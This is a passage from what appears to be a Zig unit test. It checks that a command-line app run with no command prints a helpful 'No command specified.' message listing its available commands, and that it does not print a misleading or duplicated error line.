    const cap = try runCapture(App, &.{});
    defer cap.deinit(testing.allocator);

    try testing.expect(cap.err == null); // handled -> suppressed
    try testing.expect(contains(cap.stderr, "No command specified."));
    try testing.expect(contains(cap.stderr, "Available commands:"));
    try testing.expect(contains(cap.stderr, "search"));
    try testing.expect(contains(cap.stderr, "status"));
    // Never the useless "Unknown command 'unknown'".
    try testing.expect(!contains(cap.stderr, "Unknown command 'unknown'"));
    // The registry's own bare fallback must not double-print.
    try testing.expect(!contains(cap.stderr, "Use --help for usage information"));
}
